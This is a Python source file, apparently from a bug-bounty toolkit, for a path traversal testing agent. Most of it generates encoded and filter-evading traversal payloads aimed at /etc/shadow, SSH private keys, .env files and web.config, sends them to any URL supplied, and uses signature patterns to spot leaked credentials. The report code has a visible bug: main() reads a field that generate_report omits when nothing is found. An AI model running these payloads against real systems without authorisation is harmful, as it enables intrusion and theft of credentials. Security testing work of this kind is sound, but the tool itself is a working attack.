"""
Path Traversal Tester Agent

Advanced directory traversal and path manipulation testing agent.

Tests for:
- Basic directory traversal (../, ..\)
- Encoding bypass (URL encoding, double encoding, UTF-8 overlong)
- Null byte injection (%00)
- Absolute path access
- Path normalization bypass
- Platform-specific paths (Windows/Linux)
- Filter evasion techniques
- File signature detection

Author: BountyHound Team
Version: 3.0.0
"""

from engine.core.tool_bridge import sync_nuclei_scan, sync_nmap_scan, sync_ffuf_fuzz, sync_sqlmap_test, sync_amass_enum, sync_gobuster_enum, sync_bloodhound_enum, sync_metasploit_execute, sync_nessus_scan, sync_volatility_analyze, sync_zeek_analyze
import re
import urllib.parse
import time
from typing import List, Dict, Optional, Tuple, Set
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from colorama import Fore, Style


try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

# Database integration
from engine.core.db_hooks import DatabaseHooks
from engine.core.database import BountyHoundDB
from engine.core.payload_hooks import PayloadHooks


class PathTraversalType(Enum):
    """Types of path traversal attacks"""
    BASIC = "basic_traversal"
    ENCODED = "encoded_traversal"
    NULL_BYTE = "null_byte_injection"
    ABSOLUTE = "absolute_path"
    NORMALIZATION = "path_normalization"
    UNICODE = "unicode_bypass"
    FILTER_EVASION = "filter_evasion"
    WINDOWS = "windows_specific"


class Platform(Enum):
    """Target platform types"""
    LINUX = "linux"
    WINDOWS = "windows"
    UNKNOWN = "unknown"


class SeverityLevel(Enum):
    """Severity levels for findings"""
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"


@dataclass
class PathTraversalPayload:
    """Path traversal test payload"""
    payload: str
    attack_type: PathTraversalType
    target_file: str
    platform: Platform
    encoding: Optional[str] = None
    description: str = ""


@dataclass
class FileSignature:
    """Known file signature for detection"""
    file_path: str
    signatures: List[str]
    platform: Platform
    severity: SeverityLevel


@dataclass
class PathTraversalFinding:
    """Path traversal vulnerability finding"""
    endpoint: str
    parameter: str
    payload: str
    attack_type: PathTraversalType
    platform: Platform
    accessed_file: str
    severity: SeverityLevel
    evidence: str
    impact: str
    remediation: str
    cvss_score: float
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())

    def to_dict(self) -> Dict:
        """Convert finding to dictionary."""
        return {
            'endpoint': self.endpoint,
            'parameter': self.parameter,
            'payload': self.payload,
            'attack_type': self.attack_type.value,
            'platform': self.platform.value,
            'accessed_file': self.accessed_file,
            'severity': self.severity.value,
            'evidence': self.evidence,
            'impact': self.impact,
            'remediation': self.remediation,
            'cvss_score': self.cvss_score,
            'timestamp': self.timestamp
        }


class FileSignatureDatabase:
    """Database of known file signatures"""

    SIGNATURES = {
        # Linux files
        "/etc/passwd": FileSignature(
            file_path="/etc/passwd",
            signatures=[
                r"root:x:0:0:",
                r"daemon:x:1:1:",
                r"bin:x:2:2:",
                r"nobody:x:\d+:\d+:",
                r"[a-z0-9_-]+:x:\d+:\d+:"
            ],
            platform=Platform.LINUX,
            severity=SeverityLevel.CRITICAL
        ),
        "/etc/shadow": FileSignature(
            file_path="/etc/shadow",
            signatures=[
                r"root:\$[1-9]\$",
                r"root:!:",
                r"[a-z0-9_-]+:\$[1-9]\$[a-zA-Z0-9/\.]+:\d+:",
                r"[a-z0-9_-]+:!+:",
                r"[a-z0-9_-]+:\*:"
            ],
            platform=Platform.LINUX,
            severity=SeverityLevel.CRITICAL
        ),
        "/etc/hosts": FileSignature(
            file_path="/etc/hosts",
            signatures=[
                r"127\.0\.0\.1\s+localhost",
                r"::1\s+localhost",
                r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\s+[a-z0-9\.-]+"
            ],
            platform=Platform.LINUX,
            severity=SeverityLevel.HIGH
        ),
        # Windows files
        "C:\\windows\\win.ini": FileSignature(
            file_path="C:\\windows\\win.ini",
            signatures=[
                r"\[fonts\]",
                r"\[extensions\]",
                r"\[mci extensions\]",
                r"\[files\]",
                r"; for 16-bit app support"
            ],
            platform=Platform.WINDOWS,
            severity=SeverityLevel.CRITICAL
        ),
        "C:\\boot.ini": FileSignature(
            file_path="C:\\boot.ini",
            signatures=[
                r"\[boot loader\]",
                r"timeout=",
                r"default=",
                r"\[operating systems\]",
                r"multi\(0\)disk\(0\)rdisk\(0\)"
            ],
            platform=Platform.WINDOWS,
            severity=SeverityLevel.CRITICAL
        ),
        # Application files
        ".env": FileSignature(
            file_path=".env",
            signatures=[
                r"DB_PASSWORD=",
                r"API_KEY=",
                r"SECRET_KEY=",
                r"AWS_ACCESS_KEY_ID=",
                r"DATABASE_URL="
            ],
            platform=Platform.UNKNOWN,
            severity=SeverityLevel.CRITICAL
        ),
        "config.php": FileSignature(
            file_path="config.php",
            signatures=[
                r"\$db_password\s*=",
                r"define\(['\"]DB_PASSWORD['\"]",
                r"\$config\[['\"]database['\"]\]",
                r"mysqli_connect\(",
                r"PDO\(['\"]mysql:"
            ],
            platform=Platform.UNKNOWN,
            severity=SeverityLevel.CRITICAL
        )
    }

    @classmethod
    def detect_file(cls, content: str) -> Optional[FileSignature]:
        """Detect file type from content"""
        for file_sig in cls.SIGNATURES.values():
            for signature in file_sig.signatures:
                if re.search(signature, content, re.IGNORECASE | re.MULTILINE):
                    return file_sig
        return None


class EncodingEngine:
    """Encoding and obfuscation engine"""

    @staticmethod
    def url_encode(payload: str) -> str:
        """URL encode payload"""
        return urllib.parse.quote(payload, safe='')

    @staticmethod
    def double_url_encode(payload: str) -> str:
        """Double URL encode payload"""
        return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')

    @staticmethod
    def utf8_overlong(char: str) -> str:
        """UTF-8 overlong encoding"""
        encodings = {
            '/': '%c0%af',
            '\\': '%c0%5c',
            '.': '%c0%2e'
        }
        return encodings.get(char, char)

    @staticmethod
    def utf8_overlong_3byte(char: str) -> str:
        """UTF-8 overlong 3-byte encoding"""
        encodings = {
            '/': '%e0%80%af',
            '\\': '%e0%80%5c',
            '.': '%e0%80%2e'
        }
        return encodings.get(char, char)

    @staticmethod
    def unicode_encode(char: str) -> str:
        """Unicode encoding"""
        encodings = {
            '/': '%u2215',
            '\\': '%u2216',
            '.': '%u002e'
        }
        return encodings.get(char, char)

    @staticmethod
    def mixed_encoding(payload: str) -> List[str]:
        """Generate multiple mixed encoding variants"""
        variants = []

        # Mix of URL and UTF-8 overlong
        variant1 = payload.replace('../', '%2e%2e%c0%af')
        variants.append(variant1)

        # Mix of double URL and normal
        variant2 = payload.replace('../', '%252e%252e%2f')
        variants.append(variant2)

        # Mix of all encodings
        variant3 = payload.replace('../', '%2e%2e%c0%af').replace('/', '%2f')
        variants.append(variant3)

        return variants


class PayloadGenerator:
    """Generate path traversal payloads"""

    LINUX_TARGETS = [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/etc/group",
        "/root/.ssh/id_rsa",
        "/var/www/html/.env",
        "/proc/self/environ",
        "/var/log/apache2/access.log"
    ]

    WINDOWS_TARGETS = [
        "C:\\windows\\win.ini",
        "C:\\windows\\system.ini",
        "C:\\boot.ini",
        "C:\\windows\\system32\\drivers\\etc\\hosts",
        "C:\\inetpub\\wwwroot\\web.config"
    ]

    def __init__(self):
        self.encoder = EncodingEngine()

    def generate_basic_traversal(self, target: str, platform: Platform, depth: int = 8) -> List[PathTraversalPayload]:
        """Generate basic traversal payloads"""
        payloads = []

        if platform == Platform.LINUX:
            separator = "/"
            target_path = target.lstrip('/')
        else:
            separator = "\\"
            target_path = target.replace('C:\\', '').replace('/', '\\')

        for i in range(1, depth + 1):
            traversal = f"..{separator}" * i
            payload = f"{traversal}{target_path}"

            payloads.append(PathTraversalPayload(
                payload=payload,
                attack_type=PathTraversalType.BASIC,
                target_file=target,
                platform=platform,
                description=f"Basic traversal with {i} levels"
            ))

        return payloads

    def generate_encoded_traversal(self, target: str, platform: Platform) -> List[PathTraversalPayload]:
        """Generate encoded traversal payloads"""
        payloads = []
        base_payload = "../../../" + target.lstrip('/')

        # URL encoding
        encoded = self.encoder.url_encode(base_payload)
        payloads.append(PathTraversalPayload(
            payload=encoded,
            attack_type=PathTraversalType.ENCODED,
            target_file=target,
            platform=platform,
            encoding="url",
            description="URL encoded traversal"
        ))

        # Double URL encoding
        double_encoded = self.encoder.double_url_encode(base_payload)
        payloads.append(PathTraversalPayload(
            payload=double_encoded,
            attack_type=PathTraversalType.ENCODED,
            target_file=target,
            platform=platform,
            encoding="double_url",
            description="Double URL encoded traversal"
        ))

        # UTF-8 overlong
        utf8_payload = base_payload.replace('/', self.encoder.utf8_overlong('/'))
        utf8_payload = utf8_payload.replace('.', self.encoder.utf8_overlong('.'))
        payloads.append(PathTraversalPayload(
            payload=utf8_payload,
            attack_type=PathTraversalType.ENCODED,
            target_file=target,
            platform=platform,
            encoding="utf8_overlong",
            description="UTF-8 overlong encoded traversal"
        ))

        # Mixed encodings
        for mixed in self.encoder.mixed_encoding(base_payload):
            payloads.append(PathTraversalPayload(
                payload=mixed,
                attack_type=PathTraversalType.ENCODED,
                target_file=target,
                platform=platform,
                encoding="mixed",
                description="Mixed encoding traversal"
            ))

        return payloads

    def generate_null_byte_payloads(self, target: str, platform: Platform) -> List[PathTraversalPayload]:
        """Generate null byte injection payloads"""
        payloads = []
        base_payload = "../../../" + target.lstrip('/')

        extensions = [".jpg", ".png", ".txt", ".pdf", ".html"]

        for ext in extensions:
            # Basic null byte
            payload = f"{base_payload}%00{ext}"
            payloads.append(PathTraversalPayload(
                payload=payload,
                attack_type=PathTraversalType.NULL_BYTE,
                target_file=target,
                platform=platform,
                description=f"Null byte injection with {ext}"
            ))

            # Null byte in middle
            parts = base_payload.split('/')
            if len(parts) > 1:
                payload = '/'.join(parts[:-1]) + f"/%00{parts[-1]}{ext}"
                payloads.append(PathTraversalPayload(
                    payload=payload,
                    attack_type=PathTraversalType.NULL_BYTE,
                    target_file=target,
                    platform=platform,
                    description=f"Null byte in path with {ext}"
                ))

        return payloads

    def generate_absolute_paths(self, target: str, platform: Platform) -> List[PathTraversalPayload]:
        """Generate absolute path payloads"""
        payloads = []

        # Direct absolute path
        payloads.append(PathTraversalPayload(
            payload=target,
            attack_type=PathTraversalType.ABSOLUTE,
            target_file=target,
            platform=platform,
            description="Direct absolute path access"
        ))

        # URL encoded absolute path
        encoded = self.encoder.url_encode(target)
        payloads.append(PathTraversalPayload(
            payload=encoded,
            attack_type=PathTraversalType.ABSOLUTE,
            target_file=target,
            platform=platform,
            encoding="url",
            description="URL encoded absolute path"
        ))

        if platform == Platform.WINDOWS:
            # UNC path
            target_path = target.replace('C:\\', '')
            unc_payload = f"\\\\localhost\\C$\\{target_path}"
            payloads.append(PathTraversalPayload(
                payload=unc_payload,
                attack_type=PathTraversalType.ABSOLUTE,
                target_file=target,
                platform=platform,
                description="UNC path access"
            ))

        return payloads

    def generate_normalization_bypass(self, target: str, platform: Platform) -> List[PathTraversalPayload]:
        """Generate path normalization bypass payloads"""
        payloads = []
        target_path = target.lstrip('/')

        # Dot segment manipulation
        payload = f"....//....//....//..../{target_path}"
        payloads.append(PathTraversalPayload(
            payload=payload,
            attack_type=PathTraversalType.NORMALIZATION,
            target_file=target,
            platform=platform,
            description="Dot segment manipulation"
        ))

        # Extra slashes
        payload = f"..//////..//////..//////{target_path}"
        payloads.append(PathTraversalPayload(
            payload=payload,
            attack_type=PathTraversalType.NORMALIZATION,
            target_file=target,
            platform=platform,
            description="Extra slash injection"
        ))

        # Mixed separators
        payload = f"..\\/../\\/../\\/../{target_path}"
        payloads.append(PathTraversalPayload(
            payload=payload,
            attack_type=PathTraversalType.NORMALIZATION,
            target_file=target,
            platform=platform,
            description="Mixed separator attack"
        ))

        # Semicolon injection
        payload = f"..;/..;/..;/{target_path}"
        payloads.append(PathTraversalPayload(
            payload=payload,
            attack_type=PathTraversalType.NORMALIZATION,
            target_file=target,
            platform=platform,
            description="Semicolon path injection"
        ))

        return payloads

    def generate_filter_evasion(self, target: str, platform: Platform) -> List[PathTraversalPayload]:
        """Generate filter evasion payloads"""
        payloads = []

        # Case variation (Windows)
        if platform == Platform.WINDOWS:
            varied = target.replace('windows', 'WiNdOwS').replace('system32', 'SyStEm32')
            payloads.append(PathTraversalPayload(
                payload=f"../../../{varied}",
                attack_type=PathTraversalType.FILTER_EVASION,
                target_file=target,
                platform=platform,
                description="Case variation bypass"
            ))

        # Prepend base path
        payload = f"/var/www/html/../../../../{target.lstrip('/')}"
        payloads.append(PathTraversalPayload(
            payload=payload,
            attack_type=PathTraversalType.FILTER_EVASION,
            target_file=target,
            platform=platform,
            description="Base path prepend"
        ))

        # Encoded dots
        payload = f"%2e%2e/%2e%2e/%2e%2e/{target.lstrip('/')}"
        payloads.append(PathTraversalPayload(
            payload=payload,
            attack_type=PathTraversalType.FILTER_EVASION,
            target_file=target,
            platform=platform,
            description="Encoded dot bypass"
        ))

        return payloads

    def generate_all_payloads(self, platform: Platform = Platform.LINUX) -> List[PathTraversalPayload]:
        """Generate all payload types"""
        all_payloads = []

        targets = self.LINUX_TARGETS if platform == Platform.LINUX else self.WINDOWS_TARGETS

        for target in targets:
            all_payloads.extend(self.generate_basic_traversal(target, platform))
            all_payloads.extend(self.generate_encoded_traversal(target, platform))
            all_payloads.extend(self.generate_null_byte_payloads(target, platform))
            all_payloads.extend(self.generate_absolute_paths(target, platform))
            all_payloads.extend(self.generate_normalization_bypass(target, platform))
            all_payloads.extend(self.generate_filter_evasion(target, platform))

        return all_payloads


class ResponseAnalyzer:
    """Analyze responses for path traversal success"""

    def __init__(self):
        self.file_db = FileSignatureDatabase()

    def analyze_response(self, response: Dict, payload: PathTraversalPayload) -> Optional[PathTraversalFinding]:
        """Analyze response for successful traversal"""
        content = response.get('body', '')
        status_code = response.get('status_code', 0)
        headers = response.get('headers', {})

        # Skip error responses
        if status_code >= 400:
            return None

        # Detect file signature
        detected_file = self.file_db.detect_file(content)

        if not detected_file:
            # Check for other indicators
            if self._has_traversal_indicators(content):
                detected_file = FileSignature(
                    file_path="unknown",
                    signatures=[],
                    platform=Platform.UNKNOWN,
                    severity=SeverityLevel.MEDIUM
                )
            else:
                return None

        # Calculate severity
        severity = self._calculate_severity(detected_file, payload)

        # Generate evidence
        evidence = self._extract_evidence(content, detected_file)

        # Create finding
        finding = PathTraversalFinding(
            endpoint=response.get('url', ''),
            parameter=response.get('parameter', ''),
            payload=payload.payload,
            attack_type=payload.attack_type,
            platform=payload.platform,
            accessed_file=detected_file.file_path,
            severity=severity,
            evidence=evidence,
            impact=self._generate_impact(detected_file),
            remediation=self._generate_remediation(payload.attack_type),
            cvss_score=self._calculate_cvss(severity)
        )

        return finding

    def _has_traversal_indicators(self, content: str) -> bool:
        """Check for path traversal indicators"""
        indicators = [
            r"<\?php",  # PHP source
            r"import\s+\w+",  # Python imports
            r"require\(['\"]",  # Node.js require
            r"package\s+\w+;",  # Java package
            r"#include\s+<",  # C/C++ includes
            r"DB_PASSWORD",  # Config variables
            r"SECRET_KEY",
            r"API_KEY"
        ]

        for indicator in indicators:
            if re.search(indicator, content):
                return True

        return False

    def _calculate_severity(self, file_sig: FileSignature, payload: PathTraversalPayload) -> SeverityLevel:
        """Calculate finding severity"""
        # Use file signature severity as base
        severity = file_sig.severity

        # Adjust based on attack complexity
        if payload.attack_type == PathTraversalType.BASIC:
            # Easy to exploit
            return severity
        elif payload.attack_type in [PathTraversalType.ENCODED, PathTraversalType.FILTER_EVASION]:
            # Moderate complexity, slightly lower impact perception
            if severity == SeverityLevel.CRITICAL:
                return SeverityLevel.HIGH

        return severity

    def _extract_evidence(self, content: str, file_sig: FileSignature) -> str:
        """Extract evidence from response"""
        # Extract first 500 characters
        evidence = content[:500]

        # Find matching signatures
        for signature in file_sig.signatures:
            match = re.search(signature, content, re.MULTILINE)
            if match:
                # Get context around match
                start = max(0, match.start() - 50)
                end = min(len(content), match.end() + 50)
                evidence = content[start:end]
                break

        return evidence

    def _generate_impact(self, file_sig: FileSignature) -> str:
        """Generate impact description"""
        impacts = {
            "/etc/passwd": "Disclosure of system user accounts, potential for further enumeration attacks",
            "/etc/shadow": "Exposure of password hashes, enabling offline password cracking attacks",
            ".env": "Disclosure of sensitive credentials including database passwords, API keys, and secrets",
            "config.php": "Exposure of database credentials and application configuration",
            "C:\\windows\\win.ini": "Disclosure of Windows system configuration",
            "web.config": "Exposure of .NET application configuration and potential credentials"
        }

        return impacts.get(file_sig.file_path,
                          "Unauthorized file system access enabling information disclosure")

    def _generate_remediation(self, attack_type: PathTraversalType) -> str:
        """Generate remediation advice"""
        remediations = {
            PathTraversalType.BASIC: "Implement strict input validation, use whitelist of allowed files, resolve canonical paths",
            PathTraversalType.ENCODED: "Decode all inputs before validation, use whitelist validation, implement canonicalization",
            PathTraversalType.NULL_BYTE: "Upgrade to modern runtime (PHP 5.3.4+), validate file extensions after null byte stripping",
            PathTraversalType.ABSOLUTE: "Reject absolute paths, use chroot jails, implement path prefix validation",
            PathTraversalType.NORMALIZATION: "Use secure path APIs (realpath, Path.normalize), validate after normalization",
            PathTraversalType.FILTER_EVASION: "Implement multiple validation layers, use whitelist approach, validate canonical paths"
        }

        return remediations.get(attack_type, "Implement comprehensive input validation and access controls")

    def _calculate_cvss(self, severity: SeverityLevel) -> float:
        """Calculate CVSS score"""
        scores = {
            SeverityLevel.CRITICAL: 9.1,
            SeverityLevel.HIGH: 7.5,
            SeverityLevel.MEDIUM: 5.3,
            SeverityLevel.LOW: 3.1,
            SeverityLevel.INFO: 0.0
        }
        return scores.get(severity, 0.0)


class PathTraversalTester:
    """Main path traversal testing engine"""

    def __init__(self, target_url: str, param_name: Optional[str] = None,
                 target: Optional[str] = None, timeout: int = 10,
                 verify_ssl: bool = True):
        """
        Initialize Path Traversal Tester.

        Args:
            target_url: Target URL to test
            param_name: Parameter name to inject into (e.g., 'file')
            target: Target identifier for database tracking
            timeout: Request timeout in seconds
            verify_ssl: Whether to verify SSL certificates
        """
        if not REQUESTS_AVAILABLE:
            raise ImportError("requests library is required. Install with: pip install requests")

        self.target_url = target_url
        self.param_name = param_name
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.payload_gen = PayloadGenerator()
        self.analyzer = ResponseAnalyzer()
        self.findings: List[PathTraversalFinding] = []
        self.tests_run = 0

        # Extract domain from URL for database tracking
        if target:
            self.target = target
        else:
            from urllib.parse import urlparse
            parsed = urlparse(target_url)
            self.target = parsed.netloc or "unknown-target"

    def detect_platform(self, initial_response: Optional[requests.Response] = None) -> Platform:
        """Detect target platform"""
        if initial_response:
            headers = initial_response.headers
            server = headers.get('Server', '').lower()

            # Check server header
            if 'iis' in server or 'microsoft' in server:
                return Platform.WINDOWS
            elif 'apache' in server or 'nginx' in server:
                return Platform.LINUX

        # Try platform-specific test
        try:
            # Test for Linux
            test_payload = "../../../etc/passwd"
            response = self._make_request(test_payload, silent=True)
            if response and "root:x:0:0:" in response.text:
                return Platform.LINUX

            # Test for Windows
            test_payload = "..\\..\\..\\windows\\win.ini"
            response = self._make_request(test_payload, silent=True)
            if response and "[fonts]" in response.text:
                return Platform.WINDOWS
        except Exception:
            pass

        return Platform.UNKNOWN

    def run_all_tests(self) -> List[PathTraversalFinding]:
        """
        Run all path traversal tests.

        Returns:
            List of findings
        """
        # Database check
        print(f"{Fore.CYAN}[DATABASE] Checking history for {self.target}...{Style.RESET_ALL}")
        context = DatabaseHooks.before_test(self.target, 'path_traversal_tester')

        if context['should_skip']:
            print(f"{Fore.YELLOW}[SKIP] {context['reason']}{Style.RESET_ALL}")
            if context.get('previous_findings'):
                print(f"Previous findings: {len(context['previous_findings'])}")
            return []
        else:
            print(f"{Fore.GREEN}[OK] {context['reason']}{Style.RESET_ALL}")

        print(f"{Fore.CYAN}[*] Starting path traversal testing...{Style.RESET_ALL}")
        print(f"[*] Target: {self.target_url}")
        print(f"[*] Parameter: {self.param_name or 'INJECT placeholder'}")

        # Detect platform
        platform = self.detect_platform()
        print(f"[*] Detected platform: {platform.value}")

        # Test both platforms if unknown
        platforms = [platform] if platform != Platform.UNKNOWN else [Platform.LINUX, Platform.WINDOWS]

        for test_platform in platforms:
            print(f"\n{Fore.YELLOW}[*] Testing {test_platform.value} paths...{Style.RESET_ALL}")
            findings = self.test_platform(test_platform)
            self.findings.extend(findings)

            # If we found vulnerabilities, no need to test other platform
            if findings:
                break

        # Record results in database
        db = BountyHoundDB()
        db.record_tool_run(
            self.target,
            'path_traversal_tester',
            findings_count=len(self.findings),
            duration_seconds=0,
            success=True
        )

        # Record successful payloads
        for finding in self.findings:
            if finding.severity in [SeverityLevel.CRITICAL, SeverityLevel.HIGH]:
                PayloadHooks.record_payload_success(
                    payload_text=finding.payload,
                    vuln_type='PATH_TRAVERSAL',
                    context=finding.attack_type.value,
                    notes=f"Accessed {finding.accessed_file}"
                )

        print(f"\n{Fore.CYAN}=== PATH TRAVERSAL TESTING COMPLETE ==={Style.RESET_ALL}")
        print(f"Tests run: {self.tests_run}")
        print(f"Findings: {len(self.findings)}")

        if self.findings:
            self._print_findings_summary()

        return self.findings

    def test_platform(self, platform: Platform) -> List[PathTraversalFinding]:
        """Test specific platform"""
        findings = []

        # Generate payloads for platform
        payloads = self.payload_gen.generate_all_payloads(platform)

        print(f"[*] Generated {len(payloads)} payloads")

        for payload in payloads:
            self.tests_run += 1

            # Make request
            response = self._make_request_with_payload(payload)

            if response:
                # Analyze response
                finding = self.analyzer.analyze_response(response, payload)
                if finding:
                    findings.append(finding)
                    print(f"{Fore.GREEN}[!] VULNERABILITY FOUND: {finding.accessed_file}{Style.RESET_ALL}")

        return findings

    def _make_request_with_payload(self, payload: PathTraversalPayload) -> Optional[Dict]:
        """Make request with path traversal payload"""
        response = self._make_request(payload.payload)

        if response:
            return {
                'url': self.target_url,
                'parameter': self.param_name or 'INJECT',
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'body': response.text
            }

        return None

    def _make_request(self, payload: str, silent: bool = False) -> Optional[requests.Response]:
        """
        Make HTTP request with injected payload.

        Args:
            payload: Payload to inject
            silent: Suppress output

        Returns:
            Response object or None
        """
        try:
            # Build request URL
            if self.param_name:
                # Inject into parameter
                test_url = f"{self.target_url}?{self.param_name}={urllib.parse.quote(payload, safe='')}"
            else:
                # Replace INJECT placeholder
                test_url = self.target_url.replace("INJECT", payload)

            if not silent:
                print(f"  Testing: {payload[:80]}{'...' if len(payload) > 80 else ''}")

            response = requests.get(
                test_url,
                timeout=self.timeout,
                allow_redirects=False,
                verify=self.verify_ssl
            )

            return response

        except requests.exceptions.Timeout:
            return None
        except Exception as e:
            if not silent:
                print(f"  Error: {str(e)}")
            return None

    def _print_findings_summary(self):
        """Print summary of findings."""
        print(f"\n{Fore.RED}[!] PATH TRAVERSAL VULNERABILITIES FOUND:{Style.RESET_ALL}")

        # Group by severity
        by_severity = {}
        for finding in self.findings:
            severity = finding.severity.value
            if severity not in by_severity:
                by_severity[severity] = []
            by_severity[severity].append(finding)

        # Print by severity
        for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']:
            if severity in by_severity:
                findings = by_severity[severity]
                print(f"\n{severity}: {len(findings)}")
                for f in findings[:3]:  # Show first 3
                    print(f"  - {f.accessed_file}")
                    print(f"    Payload: {f.payload[:60]}{'...' if len(f.payload) > 60 else ''}")
                    print(f"    Type: {f.attack_type.value}")

    def get_findings(self) -> List[PathTraversalFinding]:
        """Get all findings."""
        return self.findings

    def get_findings_by_severity(self, severity: SeverityLevel) -> List[PathTraversalFinding]:
        """Get findings by severity level."""
        return [f for f in self.findings if f.severity == severity]

    def generate_report(self) -> Dict:
        """Generate comprehensive test report"""
        if not self.findings:
            return {
                'status': 'no_findings',
                'total_tests': self.tests_run,
                'findings': []
            }

        # Group by severity
        by_severity = {}
        for finding in self.findings:
            severity = finding.severity.value
            if severity not in by_severity:
                by_severity[severity] = []
            by_severity[severity].append(finding)

        # Calculate statistics
        total_critical = len(by_severity.get('CRITICAL', []))
        total_high = len(by_severity.get('HIGH', []))
        total_medium = len(by_severity.get('MEDIUM', []))
        total_low = len(by_severity.get('LOW', []))

        return {
            'status': 'vulnerable',
            'total_tests': self.tests_run,
            'total_findings': len(self.findings),
            'critical': total_critical,
            'high': total_high,
            'medium': total_medium,
            'low': total_low,
            'findings': [f.to_dict() for f in self.findings],
            'summary': self._generate_summary()
        }

    def _generate_summary(self) -> str:
        """Generate executive summary"""
        total = len(self.findings)
        critical_count = sum(1 for f in self.findings if f.severity == SeverityLevel.CRITICAL)

        if critical_count > 0:
            return f"CRITICAL: Found {critical_count} critical path traversal vulnerabilities allowing access to sensitive system files"
        else:
            return f"Found {total} path traversal vulnerabilities with varying severity levels"


def main():
    """CLI interface."""
    import sys

    if len(sys.argv) < 2:
        print("Usage: python path_traversal_tester.py <url_with_INJECT_or_param> [param_name]")
        print("Example: python path_traversal_tester.py 'http://example.com/download?file=INJECT'")
        print("         python path_traversal_tester.py 'http://example.com/download' 'file'")
        sys.exit(1)

    target_url = sys.argv[1]
    param_name = sys.argv[2] if len(sys.argv) > 2 else None

    tester = PathTraversalTester(target_url, param_name)
    findings = tester.run_all_tests()

    # Generate report
    report = tester.generate_report()

    print(f"\n{Fore.CYAN}=== FINAL REPORT ==={Style.RESET_ALL}")
    print(f"Total tests: {report['total_tests']}")
    print(f"Findings: {report['total_findings']}")

    if findings:
        print(f"\n{Fore.RED}[!] Path traversal vulnerabilities detected!{Style.RESET_ALL}")
        print(f"Review findings and validate manually.")


if __name__ == "__main__":
    main()
